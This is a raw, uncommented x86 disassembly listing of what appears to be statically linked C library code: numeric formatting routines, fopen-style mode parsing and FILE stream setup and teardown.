call fcn.0808c750
mov edx, dword [var_20h]
mov eax, dword [var_24h]
sub eax, esi
mov edi, dword [edx + eax*4]
lea ecx, [eax + 1]
test edi, edi
cmovne eax, ecx
jmp 0x806952f
mov edx, dword [var_98h]
mov dword [var_8h], ebx
mov dword [var_4h], edi
mov dword [esp], edi
mov dword [var_ch], edx
call fcn.0808c6f0
mov eax, dword [var_24h]
mov ecx, dword [var_98h]
mov dword [var_8h], eax
mov eax, dword [var_20h]
mov dword [var_ch], ecx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c6f0
test eax, eax
mov dword [var_78h], eax
je 0x806866f
mov edx, dword [var_24h]
mov eax, dword [var_20h]
mov ecx, dword [var_78h]
mov dword [eax + edx*4], ecx
inc dword [var_24h]
jmp 0x806866f
mov eax, dword [var_20h]
bsf ecx, dword [eax + edx]
jmp 0x8069494
mov eax, dword [var_38h]
mov dword [var_8h], ebx
mov dword [var_4h], eax
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.0808c330
test eax, eax
js 0x80685ae
lea ecx, [ebx*4]
mov dword [var_34h], ebx
mov edi, dword [var_30h]
cld
mov esi, dword [var_38h]
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov ebx, dword [var_34h]
mov eax, dword [var_30h]
bsr edx, dword [eax + ebx*4 - 4]
movzx ecx, byte [var_8ch]
xor edx, 0x1f
mov eax, ebx
shl eax, 5
sub eax, edx
sub eax, 0x41
mov dword [var_88h], eax
mov eax, 1
shl eax, cl
or dword [var_90h], eax
jmp 0x80685b1
mov ecx, dword [var_94h]
mov eax, dword [ecx + 4]
sub eax, 2
mov dword [var_10h], eax
mov eax, dword [ecx]
mov dword [var_8h], ebx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov eax, dword [var_30h]
mov dword [var_4h], eax
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.0808c7c0
mov edx, dword [var_94h]
mov dword [var_78h], eax
mov eax, dword [edx + 4]
mov edx, dword [var_78h]
add eax, dword [var_34h]
lea ebx, [eax - 2]
sub eax, 3
test edx, edx
cmove ebx, eax
jmp 0x806859f
mov eax, dword [var_9ch]
add eax, 0x1f
cmp dword [var_9ch], 0xffffffff
cmovg eax, dword [var_9ch]
sar eax, 5
mov edx, eax
lea eax, [ecx + eax*4]
shl edx, 5
mov dword [esp], eax
sub dword [var_9ch], edx
mov edx, dword [var_9ch]
mov dword [var_ch], edx
mov edx, dword [var_24h]
mov dword [var_8h], edx
lea edx, [var_48h]
mov dword [var_4h], edx
call fcn.0808c6f0
mov ecx, dword [var_70h]
mov esi, dword [var_28h]
mov dword [var_78h], eax
lea eax, [ecx + esi]
mov ecx, dword [var_78h]
cmp eax, 0xffffffff
lea edx, [eax + 0x1f]
mov edi, eax
cmovle edi, edx
sar edi, 5
add edi, dword [var_24h]
test ecx, ecx
mov dword [var_24h], edi
je 0x8068532
mov ecx, dword [var_20h]
mov eax, dword [var_78h]
mov dword [ecx + edi*4], eax
inc dword [var_24h]
jmp 0x8068532
test esi, esi
js 0x8069785
mov edx, dword [var_70h]
mov dword [esp], ecx
lea eax, [edx + esi]
mov dword [var_ch], eax
mov eax, dword [var_24h]
mov dword [var_8h], eax
lea eax, [var_48h]
mov dword [var_4h], eax
call fcn.0808c6f0
mov dword [var_28h], 0
mov dword [var_78h], eax
mov edx, dword [var_24h]
mov ecx, dword [var_78h]
mov eax, dword [var_20h]
jmp 0x80695ee
mov eax, dword [var_70h]
mov dword [esp], ecx
mov dword [var_a4h], 0
mov dword [var_a8h], 0xc
mov dword [var_ach], 0x80a70f0
mov dword [var_ch], eax
mov eax, dword [var_24h]
mov dword [var_8h], eax
lea eax, [var_48h]
mov dword [var_4h], eax
call fcn.0808c6f0
mov esi, dword [var_28h]
mov dword [var_78h], eax
mov edx, dword [var_24h]
mov dword [var_2ch], 1
mov eax, dword [var_20h]
mov ecx, dword [var_78h]
neg esi
mov dword [var_28h], esi
mov dword [eax + edx*4], ecx
inc dword [var_24h]
sub dword [var_ach], 0x10
mov eax, dword [var_ach]
cmp esi, dword [eax + 0xc]
jl 0x8069890
mov edx, dword [eax + 4]
mov ecx, dword [var_24h]
sub edx, 2
cmp ecx, edx
jge 0x8069b15
mov eax, dword [var_20h]
mov dword [var_8h], edx
mov dword [var_10h], ecx
mov edx, dword [var_ach]
mov dword [var_ch], eax
mov eax, dword [edx]
lea eax, [eax*4 + 0x80a6248]
mov dword [var_4h], eax
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.0808c7c0
mov ecx, dword [var_ach]
mov edx, dword [var_24h]
mov dword [var_78h], eax
mov esi, dword [var_78h]
mov eax, edx
add eax, dword [ecx + 4]
lea ebx, [eax - 2]
sub eax, 3
test esi, esi
cmove ebx, eax
mov esi, dword [var_28h]
mov eax, dword [var_38h]
bsr ecx, dword [eax + ebx*4 - 4]
mov eax, ebx
xor ecx, 0x1f
sub eax, edx
mov dword [var_b0h], ecx
shl eax, 5
sub eax, ecx
lea edi, [eax + 0x1f]
lea eax, [esi + 3]
cmp edi, eax
je 0x8069ab3
lea eax, [esi + 3]
cmp edi, eax
jl 0x8069aa5
je 0x8069961
dec dword [var_a8h]
cmp dword [var_ach], 0x80a7030
je 0x80698b8
test esi, esi
jg 0x80697e1
mov eax, dword [var_a4h]
mov dword [var_28h], eax
jmp 0x806866f
test esi, esi
jle 0x80698aa
mov eax, dword [var_24h]
mov dword [var_ch], 0xa
mov edi, 4
mov dword [var_8h], eax
mov eax, dword [var_20h]
mov dword [var_4h], eax
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.0808cae0
mov eax, edi
mov esi, dword [var_28h]
mov ecx, dword [var_38h]
bsf edx, dword [ecx]
mov ebx, dword [var_24h]
cmp esi, 5
cmovl eax, esi
cmp edx, eax
jge 0x8069940
cmp esi, 5
mov eax, edi
mov edx, 0x20
cmovl eax, esi
mov dword [var_8h], ebx
mov dword [var_4h], ecx
sub edx, eax
mov eax, dword [var_20h]
mov dword [var_ch], edx
mov dword [esp], eax
call fcn.0808c6f0
test eax, eax
mov dword [var_78h], eax
je 0x8069931
mov eax, dword [var_20h]
mov ecx, dword [var_78h]
mov dword [eax + ebx*4], ecx
inc ebx
mov dword [var_24h], ebx
or dword [var_a4h], 1
jmp 0x80698aa
cmp esi, 5
mov eax, edi
mov dword [var_8h], ebx
cmovl eax, esi
mov dword [var_4h], ecx
mov dword [var_ch], eax
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.0808c750
jmp 0x8069931
mov eax, dword [var_38h]
lea edx, [eax + ebx*4]
mov dword [var_f8h], eax
mov eax, dword [var_4ch]
cmp dword [edx - 4], eax
jb 0x8069987
jne 0x8069890
mov eax, dword [var_50h]
cmp dword [edx - 8], eax
jae 0x8069890
movzx ecx, byte [var_a8h]
mov eax, 1
sub esi, edi
mov dword [var_28h], esi
shl eax, cl
or dword [var_a4h], eax
mov eax, dword [var_b0h]
sub eax, esi
inc esi
cmovg eax, dword [var_b0h]
xor edi, edi
mov dword [var_b0h], eax
mov eax, dword [var_f8h]
mov ecx, dword [eax]
test ecx, ecx
jne 0x80699ce
add eax, 4
inc edi
mov edx, dword [eax]
test edx, edx
je 0x80699c4
cmp dword [var_b0h], 0x1f
je 0x8069a7e
mov ecx, dword [var_f8h]
bsf edx, dword [ecx + edi*4]
test edi, edi
jne 0x80699f8
mov eax, 0x1f
sub eax, dword [var_b0h]
cmp eax, edx
jg 0x8069a4b
mov eax, 0x1f
sub eax, dword [var_b0h]
cmp eax, edx
jg 0x8069a34
mov ecx, dword [var_f8h]
mov dword [var_ch], eax
sub ebx, edi
mov dword [var_8h], ebx
lea eax, [ecx + edi*4]
mov dword [var_4h], eax
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.0808c750
mov dword [var_24h], ebx
mov esi, dword [var_28h]
jmp 0x8069890
mov edx, dword [var_f8h]
sub ebx, edi
mov dword [var_ch], eax
inc ebx
mov dword [var_8h], ebx
lea eax, [edx + edi*4 - 4]
jmp 0x8069a1a
mov eax, dword [var_b0h]
mov dword [var_8h], ebx
mov dword [var_4h], ecx
lea edi, [ebx + 1]
inc eax
mov dword [var_ch], eax
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.0808c6f0
mov dword [var_24h], edi
mov dword [var_78h], eax
mov edx, dword [var_78h]
mov eax, dword [var_20h]
mov dword [eax + edi*4 - 4], edx
jmp 0x8069a2c
mov eax, ebx
sub eax, edi
test eax, eax
jle 0x8069aa1
mov edx, dword [var_f8h]
mov esi, dword [var_20h]
lea ecx, [edx + edi*4]
mov edx, eax
mov eax, dword [ecx]
add ecx, 4
mov dword [esi], eax
add esi, 4
dec edx
jne 0x8069a94
sub ebx, edi
jmp 0x8069a29
mov edx, dword [var_38h]
mov dword [var_f8h], edx
jmp 0x8069987
cmp ecx, 0x1c
jg 0x8069ad9
mov ecx, 0x1c
mov eax, 0xa
mov dword [var_50h], 0
sub ecx, dword [var_b0h]
shl eax, cl
mov dword [var_4ch], eax
jmp 0x806987f
mov eax, 0x20
lea edx, [var_50h]
mov dword [var_50h], 0xa0000000
sub eax, dword [var_b0h]
mov dword [var_4ch], 0
mov dword [var_8h], 2
mov dword [var_4h], edx
mov dword [esp], edx
mov dword [var_ch], eax
call fcn.0808c6f0
mov esi, dword [var_28h]
jmp 0x806987f
mov dword [var_10h], edx
mov edx, dword [var_ach]
mov eax, dword [edx]
mov dword [var_8h], ecx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov eax, dword [var_20h]
jmp 0x8069826
mov dword [var_68h], 0x80a0fb8
mov dword [var_6ch], 0x80a0fd4
jmp 0x806812f
mov ecx, 0
test ecx, ecx
je 0x8069b73
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x8068110
mov eax, dword [0x80a9ab4]
jmp 0x8069b60
lea esi, [esi]
mov dword [esp], ebx
mov dword [var_4h], esi
mov dword [var_8h], edi
call fcn.08084990
test eax, eax
je 0x8069c27
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x8069bb4
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x8069bfb
mov ecx, dword [arg_ch]
mov eax, dword [ecx + 8]
test byte [edx + eax*2 + 1], 1
je 0x8069beb
mov dword [var_68h], 0x80a0fbc
mov dword [var_6ch], 0x80a0fe4
fld xword [ebp - 0x1c]
fldz
xor edx, edx
fucompi st(1)
fstp st(0)
seta dl
mov dword [var_40h], edx
jmp 0x8068136
mov dword [var_68h], 0x80a0fc0
mov dword [var_6ch], 0x80a0ff4
jmp 0x8069bd5
mov eax, 0
test eax, eax
je 0x8069c20
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x8069bba
mov eax, dword [0x80a9ab4]
jmp 0x8069c10
lea eax, [var_40h]
mov dword [var_sp_18h], edi
mov dword [var_10h], ebx
mov dword [var_ch], eax
mov dword [var_sp_14h], esi
mov dword [var_4h], 2
lea eax, [var_28h]
mov dword [var_8h], eax
lea eax, [var_48h]
mov dword [esp], eax
call fcn.0808d740
mov edi, eax
mov dword [var_24h], eax
shl edi, 5
sub edi, 0x3f
mov dword [var_70h], edi
jmp 0x8068445
mov eax, dword [ebx]
fld qword [eax]
fst qword [ebp - 0x84]
fst qword [ebp - 0x1c]
fstp qword [esp]
call fcn.08084960
test eax, eax
je 0x8069d0c
mov eax, 0
mov dword [var_40h], 0
mov ebx, 0x80aad18
test eax, eax
je 0x8069ca7
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x8069ce0
mov ecx, dword [arg_ch]
mov eax, dword [ecx + 8]
test byte [edx + eax*2 + 1], 1
je 0x8069ccd
mov dword [var_68h], 0x80a0fb4
mov dword [var_6ch], 0x80a0fc4
jmp 0x8068136
mov dword [var_68h], 0x80a0fb8
mov dword [var_6ch], 0x80a0fd4
jmp 0x8068136
mov eax, 0
test eax, eax
je 0x8069d05
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x8069cad
mov eax, dword [0x80a9ab4]
jmp 0x8069cf5
fld qword [ebp - 0x84]
fstp qword [esp]
call fcn.08084930
test eax, eax
je 0x8069db7
fld qword [ebp - 0x84]
fldz
xor edx, edx
mov eax, 0
mov ebx, 0x80aad18
fucompi st(1)
fstp st(0)
seta dl
test eax, eax
mov dword [var_40h], edx
je 0x8069d52
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x8069d8b
mov ecx, dword [arg_ch]
mov eax, dword [ecx + 8]
test byte [edx + eax*2 + 1], 1
je 0x8069d78
mov dword [var_68h], 0x80a0fbc
mov dword [var_6ch], 0x80a0fe4
jmp 0x8068136
mov dword [var_68h], 0x80a0fc0
mov dword [var_6ch], 0x80a0ff4
jmp 0x8068136
mov eax, 0
test eax, eax
je 0x8069db0
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x8069d58
mov eax, dword [0x80a9ab4]
jmp 0x8069da0
fld qword [ebp - 0x84]
lea eax, [var_40h]
mov dword [var_4h], 2
mov dword [var_ch], eax
lea eax, [var_28h]
mov dword [var_8h], eax
lea eax, [var_48h]
mov dword [esp], eax
fstp qword [esp + 0x10]
call fcn.0808d640
mov edi, eax
mov dword [var_24h], eax
shl edi, 5
sub edi, 0x34
mov dword [var_70h], edi
jmp 0x8068136
mov dword [var_64h], 0
jmp 0x80680b0
mov eax, dword [var_5ch]
cmp byte [eax], 0
je 0x8069df5
mov ecx, dword [var_60h]
test ecx, ecx
jne 0x80680b0
mov dword [var_60h], 0xfffffffe
mov ecx, dword [arg_ch]
movzx eax, byte [ecx + 0xc]
jmp 0x80680b7
mov eax, dword [0x80a9ab4]
jmp 0x8068091
mov ecx, 0
test ecx, ecx
je 0x8069e54
mov dword [esp], 3
call section.
mov eax, dword [eax + 0x10]
mov eax, dword [eax + 0xd4]
jmp 0x8068097
mov eax, dword [0x80a9ab4]
jmp 0x8069e46
mov eax, dword [arg_ch]
test byte [eax + 0xd], 1
jne 0x8069e8e
mov edx, 0
test edx, edx
je 0x8069e87
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x28]
mov dword [var_5ch], eax
jmp 0x806809a
mov eax, dword [0x80a9ab4]
jmp 0x8069e79
mov ecx, 0
test ecx, ecx
je 0x8069eab
mov dword [esp], 3
call section.
mov eax, dword [eax + 0x10]
mov eax, dword [eax + 0x30]
jmp 0x8069e7f
mov eax, dword [0x80a9ab4]
jmp 0x8069ea3
mov dword [var_64h], 0
jmp 0x8069e1b
mov eax, dword [0x80a9ab4]
jmp 0x8068041
mov eax, 0
test eax, eax
je 0x8069ee8
mov dword [esp], 3
call section.
mov eax, dword [eax + 0x10]
mov eax, dword [eax + 0x34]
jmp 0x8068047
mov eax, dword [0x80a9ab4]
jmp 0x8069edd
mov eax, dword [0x80a9ab4]
jmp 0x8067fff
mov eax, dword [0x80a9ab4]
jmp 0x8067fdd
mov ecx, 0
test ecx, ecx
je 0x8069f87
mov dword [esp], 3
call section.
mov eax, dword [eax + 0x10]
mov eax, dword [eax + 0x2c]
mov dword [var_54h], eax
cmp byte [eax], 0
jne 0x8069f44
mov eax, 0
test eax, eax
je 0x8069f80
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x24]
mov dword [var_54h], eax
mov edx, 0
test edx, edx
je 0x8069f79
mov dword [esp], 3
call section.
mov eax, dword [eax + 0x10]
mov eax, dword [eax + 0xd0]
test eax, eax
mov dword [var_58h], eax
jne 0x8068008
mov ecx, 0
test ecx, ecx
jmp 0x8067fed
mov eax, dword [0x80a9ab4]
jmp 0x8069f59
mov eax, dword [0x80a9ab4]
jmp 0x8069f3b
mov eax, dword [0x80a9ab4]
jmp 0x8069f18
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov ebx, dword [arg_10h]
mov ecx, dword [arg_18h]
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [var_28h], str.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
test ecx, ecx
mov dword [var_24h], eax
mov dword [var_20h], edx
mov eax, str.0123456789abcdefghijklmnopqrstuvwxyz
cmovne eax, dword [var_28h]
mov edx, dword [arg_14h]
cmp edx, 8
mov dword [var_28h], eax
lea eax, [edx + edx*2]
lea eax, [eax*4 + str.nplurals]
mov dword [var_38h], eax
je 0x808da99
cmp edx, 0x10
je 0x808da56
mov edi, dword [var_20h]
mov esi, edi
xor edi, edi
test esi, esi
mov dword [var_34h], esi
mov dword [var_30h], edi
je 0x808da44
mov edi, dword [var_38h]
mov eax, dword [var_34h]
cmp dword [edi + 8], eax
ja 0x808da29
xor edx, edx
mov dword [var_2ch], 3
div dword [edi + 8]
mov ecx, eax
mov eax, dword [var_24h]
div dword [edi + 8]
mov dword [var_14h], edx
mov edx, ecx
div dword [edi + 8]
mov dword [var_1ch], eax
mov dword [var_18h], edx
dec dword [var_2ch]
xor esi, esi
mov edi, dword [var_2ch]
mov eax, dword [ebp + edi*4 - 0x1c]
test eax, eax
je 0x808d9f1
xor edx, edx
mov edi, dword [var_28h]
sub ebx, 4
div dword [arg_14h]
inc esi
mov ecx, eax
mov eax, dword [edi + edx*4]
test ecx, ecx
mov dword [ebx], eax
mov eax, ecx
jne 0x808d9d8
mov edx, dword [var_2ch]
test edx, edx
je 0x808da1f
mov edx, dword [var_38h]
movsx eax, byte [edx + 5]
cmp esi, eax
jge 0x808da18
mov ecx, dword [var_38h]
sub ebx, 4
inc esi
mov dword [ebx], 0x30
movsx eax, byte [ecx + 5]
cmp esi, eax
jl 0x808da03
mov eax, dword [var_2ch]
test eax, eax
jne 0x808d9c8
add esp, 0x2c
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [var_38h]
mov eax, dword [var_24h]
mov dword [var_2ch], 2
mov edx, dword [var_34h]
div dword [ecx + 8]
mov dword [var_18h], edx
mov dword [var_1ch], eax
jmp 0x808d9c8
mov esi, dword [var_24h]
mov dword [var_2ch], 1
mov dword [var_1ch], esi
jmp 0x808d9c8
mov edx, dword [var_20h]
test edx, edx
je 0x808da94
mov ecx, dword [var_24h]
mov esi, 8
mov edi, dword [var_28h]
mov eax, ecx
dec esi
and eax, 0xf
sub ebx, 4
shr ecx, 4
test esi, esi
mov eax, dword [edi + eax*4]
mov dword [ebx], eax
jg 0x808da65
mov ecx, dword [var_28h]
mov eax, edx
sub ebx, 4
and eax, 0xf
shr edx, 4
mov eax, dword [ecx + eax*4]
mov dword [ebx], eax
jne 0x808da7d
jmp 0x808da1f
mov edx, dword [var_24h]
jmp 0x808da7d
mov edx, dword [var_20h]
test edx, edx
je 0x808daf7
mov ecx, dword [var_24h]
mov esi, 0xa
mov edi, dword [var_28h]
mov eax, ecx
dec esi
and eax, 7
sub ebx, 4
shr ecx, 3
test esi, esi
mov eax, dword [edi + eax*4]
mov dword [ebx], eax
jg 0x808daa8
mov eax, edx
and eax, 1
shl eax, 2
or ecx, eax
shr edx, 1
jne 0x808daea
mov edx, ecx
mov edi, dword [var_28h]
mov eax, edx
sub ebx, 4
and eax, 7
shr edx, 3
mov eax, dword [edi + eax*4]
mov dword [ebx], eax
jne 0x808dad0
jmp 0x808da1f
mov esi, dword [var_28h]
sub ebx, 4
mov eax, dword [esi + ecx*4]
mov dword [ebx], eax
jmp 0x808dad0
mov edx, dword [var_24h]
jmp 0x808dad0
push ebp
mov ebp, esp
sub esp, 0x420
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov dword [var_8h], esi
mov ebx, dword [arg_ch]
mov edi, dword [arg_8h]
test ebx, ebx
je 0x8049c61
cmp byte [ebx], 0
jne 0x8049cd1
mov esi, 0x80a4f11
mov ebx, esi
lea eax, [var_40ch]
mov dword [var_sp_8h], 0x400
mov dword [var_sp_4h], eax
mov eax, dword [arg_10h]
mov dword [esp], eax
call fcn.08053300
mov edx, dword [edi + 0x5c]
test edx, edx
jle 0x8049cb3
mov dword [var_10h], eax
mov dword [var_sp_ch], esi
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], str._s_s_s_n
mov dword [esp], edi
call fcn.0804a310
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov dword [var_10h], eax
mov dword [var_sp_ch], esi
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], 0x80a46ae
mov dword [esp], edi
call fcn.08049b80
jmp 0x8049ca8
mov esi, 0x8092923
jmp 0x8049c68
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
test byte [eax + 1], 0x20
je 0x804b3d5
mov eax, dword [eax + 0x38]
test eax, eax
js 0x804b3d5
leave
ret
call fcn.08048b20
mov dword [eax], 9
mov eax, 0xffffffff
jmp 0x804b3d3
mov edx, ebx
mov ebx, dword [arg_4h]
mov eax, 0x29
int 0x80
mov ebx, edx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
xor ebx, ebx
sub esp, 0x14
mov edx, dword [arg_ch]
movsx eax, byte [edx]
cmp eax, 0x72
je 0x804a148
jg 0x804a135
cmp eax, 0x61
je 0x8049f7e
call fcn.08048b20
mov dword [eax], 0x16
xor edx, edx
add esp, 0x14
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov ebx, 0x400
mov esi, 0x1004
mov ecx, 1
lea esi, [esi]
inc edx
movsx eax, byte [edx]
cmp eax, 0x6d
je 0x804a12b
jle 0x804a100
inc ecx
cmp ecx, 4
jle 0x8049f90
mov eax, dword [arg_8h]
mov dword [var_4h], 3
mov dword [esp], eax
call fcn.08054250
xor edx, edx
cmp eax, 0xffffffff
je 0x8049f74
mov edx, eax
and edx, 3
jne 0x8049fd2
test esi, 8
je 0x8049f67
dec edx
je 0x804a0e9
test ebx, ebx
je 0x8049fe6
test ah, 4
je 0x804a0c1
mov dword [esp], 0x16c
call fcn.08050fe0
xor edx, edx
test eax, eax
mov ebx, eax
je 0x8049f74
lea eax, [eax + 0x98]
test edi, edi
mov dword [ebx + 0x48], eax
je 0x804a018
test esi, 8
mov eax, 0x8092a60
jne 0x804a01d
mov eax, 0x80929a0
mov dword [var_10h], eax
mov dword [var_8h], 0
mov dword [var_4h], 0
lea eax, [ebx + 0xb0]
mov dword [esp], ebx
mov dword [var_ch], eax
call fcn.0804e030
test edi, edi
je 0x804a054
test esi, 8
mov eax, 0x8092bc0
jne 0x804a059
mov eax, 0x8092b00
mov dword [ebx + 0x94], eax
mov dword [esp], ebx
call fcn.0804b5e0
mov eax, dword [arg_8h]
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.0804bc60
test eax, eax
je 0x804a08c
mov eax, dword [ebx]
mov edx, ebx
and eax, 0xffffefb3
or eax, esi
mov dword [ebx], eax
jmp 0x8049f74
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_4h], 0
mov dword [esp], ebx
call fcn.0804db40
mov dword [esp], ebx
call fcn.0804d500
mov dword [esp], ebx
call fcn.08051180
jmp 0x8049f72
or ah, 4
mov dword [var_4h], 4
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08054250
xor edx, edx
inc eax
jne 0x8049fe6
jmp 0x8049f74
test esi, 4
jne 0x8049fd9
jmp 0x8049f67
lea esi, [esi]
cmp eax, 0x62
je 0x8049fa3
jg 0x8049fa3
test eax, eax
je 0x8049fa9
cmp eax, 0x2b
jne 0x8049fa3
and esi, 0x1000
jmp 0x8049fa9
mov edi, 1
jmp 0x8049fa3
cmp eax, 0x77
jne 0x8049f67
mov esi, 4
jmp 0x8049f88
mov esi, 8
jmp 0x8049f88
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, eax
mov eax, dword [eax + 8]
dec eax
test eax, eax
mov dword [ebx + 8], eax
jne 0x80566b3
mov eax, dword [ebx + 0x20]
test eax, eax
jne 0x80566c5
mov eax, dword [ebx]
test eax, eax
jne 0x80566b8
mov ebx, dword [var_4h]
leave
ret
call fcn.0805d3c0
mov dword [ebx], 0
jmp 0x80566b3
mov dword [esp], eax
call fcn.08083520
mov dword [esp], ebx
call dword [ebx + 0x20]
jmp 0x80566ad
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
test byte [ebx + 1], 1
jne 0x804d827
mov eax, dword [ebx + 0x24]
mov dword [esp], eax
call fcn.08051180
mov dword [ebx + 0x24], 0
mov dword [ebx + 0x2c], 0
mov dword [ebx + 0x28], 0
mov ebx, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.0804d710
jmp 0x804d802
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov ebx, dword [arg_8h]
cmp dword [ebx + 0x38], 0xffffffff
je 0x804b796
mov eax, dword [ebx]
xor edi, edi
and eax, 0x808
cmp eax, 0x800
je 0x804b74f
mov dword [esp], ebx
call fcn.0804e6b0
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x44]
mov edx, dword [ebx + 0x5c]
test edx, edx
mov esi, eax
jle 0x804b700
mov eax, dword [ebx + 0x58]
mov eax, dword [eax + 0x20]
test eax, eax
jne 0x804b6f3
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_4h], 0
mov dword [esp], ebx
call fcn.08075a60
mov eax, dword [ebx + 0x58]
mov dword [eax + 8], 0
mov dword [eax], 0
mov dword [eax + 4], 0
mov dword [eax + 0x10], 0
mov dword [eax + 0xc], 0
mov dword [eax + 0x14], 0
mov dword [esp], ebx
call fcn.0804d500
test esi, esi
mov eax, edi
mov dword [ebx], 0xfbad240c
mov dword [ebx + 0x38], 0xffffffff
mov dword [ebx + 0x4c], 0xffffffff
mov dword [ebx + 0x50], 0xffffffff
cmovne eax, esi
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], ebx
call fcn.080761d0
jmp 0x804b675
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_4h], 0
mov dword [esp], ebx
call fcn.0804db40
mov dword [ebx + 0xc], 0
mov dword [ebx + 4], 0
mov dword [ebx + 8], 0
mov dword [ebx + 0x14], 0
mov dword [ebx + 0x10], 0
mov dword [ebx + 0x18], 0
jmp 0x804b6c1
mov ecx, dword [ebx + 0x5c]
test ecx, ecx
jle 0x804b77c
mov eax, dword [ebx + 0x58]
mov edx, dword [eax + 0x10]
sub edx, dword [eax + 0xc]
sar edx, 2
mov dword [var_8h], edx
mov eax, dword [eax + 0xc]
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.0804a340
mov edi, eax
jmp 0x804b64a
mov eax, dword [ebx + 0x14]
mov edx, dword [ebx + 0x10]
mov dword [esp], ebx
sub eax, edx
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0804bd90
jmp 0x804b775
mov eax, 0xffffffff
jmp 0x804b6eb
push ebp
mov eax, 0
mov ebp, esp
test eax, eax
mov edx, dword [arg_8h]
je 0x807455b
mov eax, dword [edx + 0x48]
mov dword [arg_8h], eax
leave
jmp section.
leave
ret
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
cmp dword [ebx + 0x38], 0xffffffff
jne 0x804bcd2
mov eax, dword [arg_ch]
mov dword [ebx + 0x4c], 0xffffffff
mov dword [ebx + 0x50], 0xffffffff
mov dword [ebx + 0x38], eax
mov eax, dword [ebx]
and eax, 0xfffffff3
or eax, 0x40
mov dword [ebx], eax
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_10h], 3
mov dword [var_ch], 1
mov dword [var_sp_4h], 0
mov dword [var_8h], 0
call dword [eax + 0x24]
and eax, edx
inc eax
jne 0x804bccb
call fcn.08048b20
cmp dword [eax], 0x1d
jne 0x804bcd2
mov eax, ebx
mov ebx, dword [var_4h]
leave
ret
xor eax, eax
jmp 0x804bccd
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov ecx, dword [ebx + 0x1c]
test ecx, ecx
je 0x804dba0
mov edx, dword [ebx]
test dl, 1
je 0x804db80
mov eax, dword [arg_ch]
mov dword [ebx + 0x1c], eax
mov eax, dword [arg_10h]
mov dword [ebx + 0x20], eax
mov eax, dword [arg_14h]
test eax, eax
je 0x804db77
and edx, 0xfffffffe
mov dword [ebx], edx
mov ebx, dword [var_4h]
leave
ret
or edx, 1
jmp 0x804db70
lea esi, [esi]
mov eax, dword [ebx + 0x20]
mov dword [esp], ecx
sub eax, ecx
add eax, 0xfff
and eax, 0xfffff000
mov dword [var_sp_4h], eax
call fcn.08054780
nop
lea esi, [esi]
mov edx, dword [ebx]
jmp 0x804db5a
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov ebx, dword [arg_10h]
test ebx, ebx
jne 0x804bda9
xor edx, edx
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov eax, dword [arg_ch]
mov dword [var_8h], ebx
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804bdd0
mov edx, 0xffffffff
cmp eax, ebx
jne 0x804bda2
jmp 0x804bda0
push ebp
mov ebp, esp
sub esp, 0x14
